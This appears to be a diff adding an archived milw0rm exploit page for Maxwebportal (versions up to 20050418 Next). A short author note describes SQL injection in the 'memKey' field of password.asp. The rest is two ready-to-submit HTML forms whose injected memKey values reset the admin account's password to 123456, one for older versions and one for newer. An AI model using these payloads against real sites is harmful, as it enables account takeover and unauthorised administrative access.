@@ -1,0 +1,38 @@
+<html><head><title>Maxwebportal <= 1.36 password.asp Change Password Exploit (1 - html)</title></head><pre>&lt;!--
+Hi, I'm Soroush Dalili from Grayhatz Security Group (GSG) . I found dangerous sql injection
+in Maxwebportal version 1.35,1.36,2.0, 20050418 Next
+Remote user can inject his/her code in &quot;memKey&quot; var. and change other users password in
+password.asp
+
+Exploit codes to proof: 
+--&gt;
+
+-----------------Code Start-----Version 1.35 and older--------------
+&lt;form action=&quot;http://[URL]/password.asp?mode=reset&quot; method=&quot;post&quot;&gt;
+&lt;br&gt;
+pass1: &lt;input name=&quot;pass&quot; type=&quot;text&quot; value=&quot;123456&quot; size=&quot;150&quot;&gt;&lt;br&gt;
+pass2: &lt;input name=&quot;pass2&quot; type=&quot;text&quot; value=&quot;123456&quot; size=&quot;150&quot;&gt;&lt;br&gt;
+Id: &lt;input name=&quot;memId&quot; type=&quot;text&quot; value=&quot;-1&quot; size=&quot;150&quot;&gt;&lt;br&gt;
+Member Key: &lt;input name=&quot;memKey&quot; type=&quot;text&quot; value=&quot;foo' or M_Name='admin&quot; size=&quot;150&quot;&gt;
+&lt;br&gt;
+&lt;input name=&quot;Submit&quot; type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
+&lt;/form&gt;
+-----------------End-------------------
+
+Version 1.36, 2.0, 20050418 Next:
+
+-----------------Code Start-----Version 1.36, 2.0, 20050418 Next--------------
+&lt;form action=&quot;http://[URL]/password.asp?mode=reset&quot; method=&quot;post&quot;&gt;
+&lt;br&gt;
+pass1: &lt;input name=&quot;pass&quot; type=&quot;text&quot; value=&quot;123456&quot; size=&quot;150&quot;&gt;&lt;br&gt;
+pass2: &lt;input name=&quot;pass2&quot; type=&quot;text&quot; value=&quot;123456&quot; size=&quot;150&quot;&gt;&lt;br&gt;
+Id: &lt;input name=&quot;memId&quot; type=&quot;text&quot; value=&quot;-1&quot; size=&quot;150&quot;&gt;&lt;br&gt;
+Member Key: &lt;input name=&quot;memKey&quot; type=&quot;text&quot; value=&quot;foo') or M_Name='admin' or ('1'='2&quot;
+
+size=&quot;150&quot;&gt;
+&lt;br&gt;
+&lt;input name=&quot;Submit&quot; type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
+&lt;/form&gt;
+-----------------End-------------------
+
+# milw0rm.com [2005-05-26]</pre></html>
